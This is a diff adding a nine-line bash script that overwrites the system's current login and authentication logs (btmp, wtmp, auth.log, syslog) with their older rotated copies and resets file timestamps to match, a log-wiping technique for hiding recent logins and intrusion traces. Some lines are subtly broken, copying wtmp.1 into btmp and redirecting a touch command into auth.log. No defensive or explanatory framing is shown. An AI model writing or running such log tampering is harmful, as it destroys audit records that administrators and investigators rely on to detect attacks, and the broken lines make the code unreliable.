@@ -1,0 +1,9 @@
+#!/bin/bash
+cat /var/log/btmp.1 > /var/log/btmp
+touch -r /var/log/btmp.1 /var/log/btmp
+cat /var/log/wtmp.1 > /var/log/btmp
+touch -r /var/log/wtmp.1 /var/log/wtmp
+cat /var/log/auth.log.1 > /var/log/auth.log
+touch -r /var/log/auth.log.1 > /var/log/auth.log
+cat /var/log/syslog.1 > /var/log/syslog
+touch -r /var/log/syslog.1 /var/log/syslog
